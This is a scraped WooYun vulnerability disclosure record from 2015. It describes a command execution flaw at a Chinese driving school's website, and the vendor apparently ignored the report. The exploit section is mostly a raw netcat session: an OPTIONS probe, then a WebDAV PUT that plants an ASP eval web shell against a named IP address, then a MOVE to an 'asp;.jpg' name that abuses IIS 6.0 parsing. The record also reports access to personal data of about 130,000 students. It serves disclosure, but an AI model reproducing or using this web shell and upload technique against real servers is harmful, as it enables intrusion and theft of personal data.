{"id": 25300, "wybug_id": "wooyun-2015-0131966", "wybug_title": "综安驾校命令执行漏洞可getshell泄露学员信息考试成绩与教练信息等数据", "wybug_corp": "综安驾校", "wybug_author": "ksss", "wybug_date": "2015-08-07 13:09", "wybug_open_date": "2015-09-21 13:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-09-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 综安驾校命令执行漏洞可getshell泄露学员信息考试成绩与教练信息等数据 详细说明：  \n\n网站使用了web dav协议使用户可以直接对网站文件进行操作，导致了命令执行。摸清了协议后，架起nc\n\n可以看到dav的关键字，直接put一个shell是不行的，限制了可写文件后缀看了一下是iis6.0的，可以用解析漏洞，先写一个jpg\nE:\\workdesk\\tools>nc.exe 113.108.111.235 80OPTIONS / HTTP/1.1Host: 113.108.111.235HTTP/1.1 200 OKDate: Wed, 05 Aug 2015 13:34:27 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETMS-Author-Via: DAVContent-Length: 0Accept-Ranges: noneDASL: <DAV:sql>DAV: 1, 2Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCHAllow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCKCache-Control: privatePUT /kaoshi/css/b.jpg HTTP/1.1Host:113.108.111.235Content-Length:23<%eval request(\"a\")%>HTTP/1.1 201 CreatedDate: Wed, 05 Aug 2015 13:34:44 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETLocation: http://113.108.111.235/kaoshi/css/b.jpgContent-Length: 0Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH,SEARCH, LOCK, UNLOCK\n文件写入成功，网站使用者不需要验证身份就可以进行文件读写。\n\n用move命令创建一个b.asp;.jpg的文件\n\n看一下数据库，存有老师及公司车辆考试成绩等等数据\n\n还包含十三万学员的身份证、手机、住址、成绩等等详细信息\n\n   漏洞证明：  \n\n\n\n   修复方案：  打webdav远程命令执行的补丁   版权声明：转载请注明来源 ksss@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-08-15 00:08 |    \t\tksss \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:25        | no!)\t\t \n  同样是驾驶系统，为什么人WooYun-2015-134178，17w就上首页，这个13w就是等认领。。。@乌云    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}